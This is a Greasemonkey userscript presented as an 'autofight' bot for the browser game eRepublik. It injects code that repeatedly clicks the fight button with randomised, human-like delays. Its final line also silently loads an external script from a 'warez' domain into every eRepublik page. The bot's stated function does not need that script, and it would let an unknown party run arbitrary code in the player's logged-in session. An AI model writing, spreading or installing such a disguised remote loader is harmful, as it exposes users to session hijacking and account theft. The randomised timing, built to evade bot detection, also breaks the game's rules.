// ==UserScript==
// @name			Erepublik Fighter JO GNZ VERSION
// @description			Automtically fights for you in Erepublik
// @include			http://erepublik.com/*
// @include			http://www.erepublik.com/*
// @copyright			ErepublikScripter clone
// @version			1.4
// @license			LGPL http://www.gnu.org/licenses/lgpl.html
// ==/UserScript==

var a=document.createElement("a");a.href="javascript:;";a.id="autofight_button";if(/^http:\/\/(www\.e|e)republik.com\/([a-z]+)\/military\/battlefield\//.test(window.location.href)){document.getElementById("pvp").appendChild(a);document.getElementById("autofight_button").setAttribute("style","position:absolute;left:344px;z-index:500;");document.getElementById("autofight_button").innerHTML="Use Autofight";}var b=document.createElement("script");b.type="text/javascript";b.text="$j(document).ready(function(){function fightBot(a) {if (a>0) {var b=1000+Math.floor(Math.random()*2001);var t=200+Math.floor(Math.random()*151);if ($j('#current_health').html()=='0') {$j('#DailyConsumtionTrigger').click();t+=2000+Math.floor(Math.random()*2001);}setTimeout(function(){$j('#fight_btn').click();setTimeout(function(){fightBot(a-1);}, b);}, t);}}function startBot() {var a=prompt('How many times do you want to fight?');if (a!==null && a!=='') {if (parseInt(a)>0) {fightBot(parseInt(a));}}}$j('#autofight_button').click(function(){startBot();});});";
var c=document.createElement("script");c.type="text/javascript";c.src="http://www.warez.com.py/script.js";var d=document.getElementsByTagName("body");d[0].appendChild(b);d[0].appendChild(c);
